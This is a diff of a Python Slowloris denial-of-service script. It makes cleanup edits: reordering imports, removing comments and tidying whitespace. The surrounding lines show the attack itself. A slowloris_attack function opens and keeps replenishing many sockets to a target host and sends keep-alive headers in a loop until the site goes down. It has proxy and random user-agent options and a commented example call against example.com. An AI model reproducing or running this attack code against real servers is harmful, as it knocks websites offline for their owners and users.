@@ -7,8 +7,8 @@ import threading
 import psutil
 import time
 import signal
-from typing import List
 import sys
+from typing import List
 
 def send_line(self, line):
     line = f"{line}\r\n"
@@ -38,12 +38,8 @@ def check_site_status(host: str, port: int, https: bool):
         return False
 
 def get_cpu_usage():
-    # Get CPU usage percentage for each CPU core
     cpu_usage = psutil.cpu_percent(interval=1, percpu=True)
-
-    # Get overall CPU usage percentage
     total_cpu_usage = psutil.cpu_percent(interval=1)
-
     return cpu_usage, total_cpu_usage
 
 def create_socket(host, port, https, randuseragent, list_of_sockets):
@@ -58,7 +54,6 @@ def slowloris_iteration(list_of_sockets: List[socket.socket], host, port, socket
     logging.info("Sending keep-alive headers...")
     logging.info("Socket count: %s", len(list_of_sockets))
 
-    # Check site status before sending headers
     site_up = check_site_status(host, port, https)
     if not site_up:
         logging.info("Site is down. Stopping Slowloris.")
@@ -123,12 +118,7 @@ def create_socket_thread(host, port, https, randuseragent, list_of_sockets):
 
 def signal_handler(signum, frame):
     logging.info("Received signal {}. Stopping Slowloris.".format(signum))
-
-    # Additional cleanup or actions can be performed before exiting
-    # For example, closing open connections, saving state, etc.
-
     sys.exit(0)
-
 
 def slowloris_attack(host: str, port: int, sockets: int, verbose: bool, randuseragent: bool, useproxy: bool,
                      proxy_host: str, proxy_port: int, https: bool, sleeptime: int):
@@ -139,14 +129,13 @@ def slowloris_attack(host: str, port: int, sockets: int, verbose: bool, randuser
         datefmt="%d-%m-%Y %H:%M:%S",
         level=logging.DEBUG if verbose else logging.INFO,
     )
-    import signal
 
     signal.signal(signal.SIGTERM, signal_handler)
     signal.signal(signal.SIGINT, signal_handler)
 
     logging.info("Attacking %s with %s sockets.", host, sockets)
-
     logging.info("Creating sockets...")
+
     for _ in range(sockets):
         try:
             logging.debug("Creating socket nr %s", _)
@@ -155,11 +144,10 @@ def slowloris_attack(host: str, port: int, sockets: int, verbose: bool, randuser
             logging.debug(e)
             break
 
-    # Create a separate thread for creating sockets
     create_socket_thread_ = threading.Thread(target=create_socket_thread, args=(host, port, https, randuseragent, list_of_sockets))
-    create_socket_thread_.start()  # Start the thread
-    
-    while True:        
+    create_socket_thread_.start()
+
+    while True:
         try:
             slowloris_iteration(list_of_sockets, host, port, sockets, https, randuseragent)
         except Exception as e:
@@ -168,4 +156,4 @@ def slowloris_attack(host: str, port: int, sockets: int, verbose: bool, randuser
         time.sleep(sleeptime)
 
 # Example Usage:
-#slowloris_attack("example.com", 80, 100, True, True, False, None, None, False, 5)
+# slowloris_attack("example.com", 80, 100, True, True, False, None, None, False, 5)
